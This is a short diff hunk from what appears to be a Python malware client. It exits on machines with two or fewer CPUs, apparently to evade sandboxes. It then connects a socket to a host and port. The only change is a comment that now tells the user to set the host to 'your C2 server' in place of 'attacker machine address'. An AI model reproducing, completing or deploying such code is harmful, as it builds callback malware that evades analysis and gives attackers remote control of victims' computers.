@@ -11,8 +11,8 @@ public_partner = None
 if os.cpu_count() <= 2:
     quit()
 
-HOST = '127.0.0.1' # Change this host address to attacker machine address
-PORT = 1337
+HOST = '127.0.0.1' # Change this host address to the address of your C2 server
+PORT = 1337 
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((HOST, PORT))
